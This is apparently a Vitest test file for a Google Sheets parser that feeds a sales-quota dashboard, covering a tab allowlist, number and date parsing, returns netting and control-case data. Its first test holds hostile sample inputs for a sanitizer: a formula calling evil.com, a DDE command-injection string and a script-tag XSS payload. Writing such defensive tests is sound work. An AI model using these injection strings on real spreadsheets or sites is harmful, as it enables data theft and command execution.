import { describe, expect, it } from 'vitest';
import fs from 'fs';
import path from 'path';
import {
  ALLOWED_GOOGLE_SHEET_TABS,
  DisallowedSheetTabError,
  assertAllowedSheetTab,
  calculateNovember2026CommercialMetrics,
  forwardFillRow,
  getConfiguredGoogleSheetId,
  parseCuotasActivacionSheetMatrix,
  parseCuotasVolumenSheetMatrix,
  parseSheetDate,
  parseSheetNumber,
  sanitizeSheetCell,
} from '../lib/googleSheetsMatrixParser';
import { INITIAL_SELLERS_ACTIVATION } from '../components/cuotas/cuotasData';
import { SELLER_VOLUME_QUOTAS } from '../components/cuotas/volumeQuotasData';

describe('November 2026 Google Sheet ("Data dashboard") Audit, Security & Accounting Engine', () => {
  it('1. enforces strict 6-tab allowlist, blocks Usuarios/Inventario, and sanitizes CSV/XSS injection', () => {
    expect(ALLOWED_GOOGLE_SHEET_TABS).toEqual([
      'Ventas',
      'Cuotas Volumen',
      'Cuotas de Activacion',
      'Productos',
      'Clientes',
      'Supervisores',
    ]);
    expect(ALLOWED_GOOGLE_SHEET_TABS).toHaveLength(6);

    for (const tab of ALLOWED_GOOGLE_SHEET_TABS) {
      expect(assertAllowedSheetTab(tab)).toBe(tab);
    }

    expect(() => assertAllowedSheetTab('Usuarios')).toThrow(DisallowedSheetTabError);
    expect(() => assertAllowedSheetTab('Inventario')).toThrow(DisallowedSheetTabError);
    expect(() => assertAllowedSheetTab('Nominas')).toThrow(DisallowedSheetTabError);

    // Sanitizes formula injection and XSS tags
    expect(sanitizeSheetCell('=IMPORTXML("http://evil.com")')).toBe('IMPORTXML("http://evil.com")');
    expect(sanitizeSheetCell('+SUM(A1:A10)')).toBe('SUM(A1:A10)');
    expect(sanitizeSheetCell('@cmd|"/c calc"!A0')).toBe('cmd|"/c calc"!A0');
    expect(sanitizeSheetCell('<script>alert(1)</script>ANGEL NAVARRO')).toBe('ANGEL NAVARRO');

    // Never exposes VITE_GOOGLE_SHEET_ID or hardcoded fallback
    expect(getConfiguredGoogleSheetId({ VITE_GOOGLE_SHEET_ID: 'SECRET' })).toBe('');
    expect(getConfiguredGoogleSheetId({ GOOGLE_SHEET_ID: 'SERVER_ONLY_ID' })).toBe('SERVER_ONLY_ID');
  });

  it('2. parses accounting numbers deterministically ("1,140.00", "498.54", "-13.20", "-", "", null)', () => {
    expect(parseSheetNumber('1,140.00')).toBe(1140);
    expect(parseSheetNumber('498.54')).toBe(498.54);
    expect(parseSheetNumber('-13.20')).toBe(-13.2);
    expect(parseSheetNumber('-891.87')).toBe(-891.87);
    expect(parseSheetNumber('-')).toBe(0);
    expect(parseSheetNumber('')).toBe(0);
    expect(parseSheetNumber(null)).toBe(0);
    expect(parseSheetNumber(undefined)).toBe(0);
    expect(parseSheetNumber('#DIV/0!')).toBe(0);
  });

  it('3. parses dates deterministically in America/Caracas (ISO, DD/MM/YYYY, and Lotus serial 46328)', () => {
    const fromIso = parseSheetDate('2026-11-02 0:00:00');
    const fromLatin = parseSheetDate('02/11/2026');
    const fromSingleDigitLatin = parseSheetDate('2/11/2026');
    const fromLotusSerial = parseSheetDate(46328);
    const fromLotusString = parseSheetDate('46328');

    const expected = {
      isoDate: '2026-11-02',
      year: 2026,
      month: 11,
      day: 2,
    };

    expect(fromIso).toEqual(expected);
    expect(fromLatin).toEqual(expected);
    expect(fromSingleDigitLatin).toEqual(expected);
    expect(fromLotusSerial).toEqual(expected);
    expect(fromLotusString).toEqual(expected);
  });

  it('4. applies forwardFillRow on merged headers in Cuotas Volumen and Cuotas de Activacion', () => {
    expect(
      forwardFillRow(['ANGEL NAVARRO', '', '', 'ELISA SOLER', '', ''])
    ).toEqual([
      'ANGEL NAVARRO',
      'ANGEL NAVARRO',
      'ANGEL NAVARRO',
      'ELISA SOLER',
      'ELISA SOLER',
      'ELISA SOLER',
    ]);

    // Verify Cuotas de Activacion maps Row 1 categories even when Row 2 has legacy "Meta Aceite" / "Meta azucar"
    const activacionCsv = [
      ',,AZUCAR,,LECHE VENCAMPO,,POLLO,,ESTANDAR Y SUPERIOR ASTURIAS,,MORTADELA SALPICAO Y ASTURIAS,',
      'Vendedor,CARTERA,Meta Aceite ,Activados,Meta azucar,Activados,Meta Pollo,Activados,Meta Estandar y Superior,Activados,Meta Salpicao y Asturias,Activados',
      'ANGEL NAVARRO,58,40,12,27,11,20,7,15,5,15,10',
    ].join('\n');

    const parsedAct = parseCuotasActivacionSheetMatrix(activacionCsv);
    expect(parsedAct.rows).toHaveLength(1);
    const angelRow = parsedAct.rows[0];
    expect(angelRow.vendedor).toBe('ANGEL NAVARRO');
    expect(angelRow.cartera).toBe(58);
    expect(angelRow.categorias.azucar).toEqual({ meta: 40, activados: 12 });
    expect(angelRow.categorias.lecheVencampo).toEqual({ meta: 27, activados: 11 });
    expect(angelRow.categorias.pollo).toEqual({ meta: 20, activados: 7 });
    expect(angelRow.categorias.estandarSuperiorAsturias).toEqual({ meta: 15, activados: 5 });
    expect(angelRow.categorias.mortadelaSalpicaoAsturias).toEqual({ meta: 15, activados: 10 });
  });

  it('5. nets returns (Kg < 0) before counting Client Activation and SKU Activation', () => {
    const sampleVentasCsv = [
      'Fecha,Id Cliente,Id Articulo,Vendedor,Cajas,Unidades,Kg,Monto,Costo,Utilidad,% de utilidad',
      // Client C001 buys 10 kg of SKU 1543, then returns -10 kg of SKU 1543 -> Net = 0 kg, $0 -> NOT activated!
      '2026-11-03 0:00:00,C001,1543,ANGEL NAVARRO,1,20,10.00,50.00,40.00,10.00,20.00%',
      '2026-11-05 0:00:00,C001,1543,ANGEL NAVARRO,-1,-20,-10.00,-50.00,-40.00,-10.00,-20.00%',
      // Client C002 buys 25 kg of SKU 1568, returns -5 kg -> Net = +20 kg, +$80 -> ACTIVATED!
      '2026-11-06 0:00:00,C002,1568,ANGEL NAVARRO,2,0,25.00,100.00,80.00,20.00,20.00%',
      '2026-11-07 0:00:00,C002,1568,ANGEL NAVARRO,0,0,-5.00,-20.00,-16.00,-4.00,-20.00%',
    ].join('\n');

    const productosCsv = [
      'Codigo,Descripción,Categoría',
      '1543,AZUCAR VENCAMPO 1KG,NO REFRIGERADO',
      '1568,POLLO VENCAMPO POR KG,POLLOS',
    ].join('\n');

    const report = calculateNovember2026CommercialMetrics({
      ventasCsv: sampleVentasCsv,
      productosCsv,
      targetYear: 2026,
      targetMonth: 11,
    });

    const angel = report.controlCaseAngelNavarro!;
    expect(angel).not.toBeNull();
    expect(angel.volumenBrutoKg).toBe(35);
    expect(angel.devolucionesKg).toBe(-15);
    expect(angel.volumenNetoKg).toBe(20);

    // C001 netted to 0 kg / $0, so only C002 is activated!
    expect(angel.clientesUnicosBrutos).toBe(2);
    expect(angel.clientesActivadosNetos).toBe(1);
    expect(angel.clientesConDevolucionTotal).toBe(1);

    // SKU 1543 netted to 0 kg, so only SKU 1568 is activated!
    expect(angel.skusConMovimientoBruto).toBe(2);
    expect(angel.skusActivadosNetos).toBe(1);
    expect(angel.skusConDevolucionTotal).toBe(1);
  });

  it('6. verifies mandatory control case ANGEL NAVARRO in synchronized November 2026 datasets', () => {
    // 1. Check INITIAL_SELLERS_ACTIVATION (Cuotas de Activacion)
    const angelAct = INITIAL_SELLERS_ACTIVATION.find((s) => s.vendedor === 'ANGEL NAVARRO');
    expect(angelAct).toBeDefined();
    expect(angelAct?.cartera).toBe(58);
    expect(angelAct?.rubros.azucar).toEqual({ meta: 40, activados: 12 });
    expect(angelAct?.rubros.lecheVencampo).toEqual({ meta: 27, activados: 11 });
    expect(angelAct?.rubros.pollo).toEqual({ meta: 20, activados: 7 });
    expect(angelAct?.rubros.estandarSuperiorAsturias).toEqual({ meta: 15, activados: 5 });
    expect(angelAct?.rubros.mortadelaSalpicaoAsturias).toEqual({ meta: 15, activados: 10 });

    // 2. Check SELLER_VOLUME_QUOTAS (Cuotas Volumen: 24,254.70 kg across 87 SKUs)
    expect(SELLER_VOLUME_QUOTAS['ANGEL NAVARRO'].kgs).toBe(24254.7);

    // 3. Check sellers_monthly_volume_cache.json on disk (4,093.17 kg net, 227 rows, 41 net clients, 38 net SKUs)
    const cachePath = path.join(process.cwd(), 'sellers_monthly_volume_cache.json');
    if (fs.existsSync(cachePath)) {
      const cacheJson = JSON.parse(fs.readFileSync(cachePath, 'utf8'));
      const angelNov = (cacheJson.sellerMonthlyData || []).find(
        (r: any) => r.vendedor === 'ANGEL NAVARRO' && r.mes === 'NOVIEMBRE'
      );
      expect(angelNov).toBeDefined();
      expect(angelNov.kgs).toBe(4093.17);
      expect(angelNov.kgsBrutos).toBe(4985.04);
      expect(angelNov.kgsDevoluciones).toBe(-891.87);
      expect(angelNov.facturasCount).toBe(227);
      expect(angelNov.clientesActivadosNetos).toBe(41);
      expect(angelNov.skusActivadosNetos).toBe(38);
    }
  });
});
